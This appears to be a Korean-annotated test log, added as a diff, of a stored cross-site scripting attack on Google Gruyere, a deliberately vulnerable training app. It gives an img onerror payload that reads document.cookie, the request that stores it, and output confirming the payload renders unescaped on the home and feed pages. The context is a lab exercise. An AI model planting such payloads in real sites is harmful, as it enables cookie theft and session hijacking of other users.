@@ -1,0 +1,20 @@
+GID=399820027374159079597995648128134925001
+BASE=https://google-gruyere.appspot.com/399820027374159079597995648128134925001
+
+### 페이로드
+<img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+
+### 0) brie 로그인 완료
+
+### 1) 저장 요청
+GET /newsnippet2?snippet=%3Cimg%20src%3Dx-nonexistent.png%20onerror%3D%22document.title%3D%27XSS-EXECUTED%27%3Bvar%20d%3Ddoc...
+→ 응답 217 bytes (302 후 리다이렉트 본문)
+
+### 2) 비인증 렌더 확인 (쿠키 없이)
+  서버 원문에 onerror= 포함 여부(이스케이프 안 됨): True
+  <div id='0'> 안의 저장된 스니펫:
+    <img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+  홈(/)의 <span id='brie'>:
+    <img src=x-nonexistent.png onerror="document.title='XSS-EXECUTED';var d=document.createElement('div');d.id='xss-proof';d.textContent='COOKIE='+document.cookie;document.body.appendChild(d)">
+  /feed.gtl?uid=brie 원문(앞 300): '_feed((\n\n\n[\n"Brie"\n\n,"<img src=x-nonexistent.png onerror="document.title=\'XSS-EXECUTED\';var d=document.createElement(\'div\');d.id=\'xss-proof\';d.textContent=\'COOKIE=\'+document.cookie;document.body.appendChild(d)">"\n\n,"Brie is the queen of the cheeses<span style=color:red>!!!</span>"\n\n]\n\n\n\n))'
+  홈/스니펫 페이지에 CSP 헤더 있는지 확인은 별도 기록(이전 라운드: 없음)
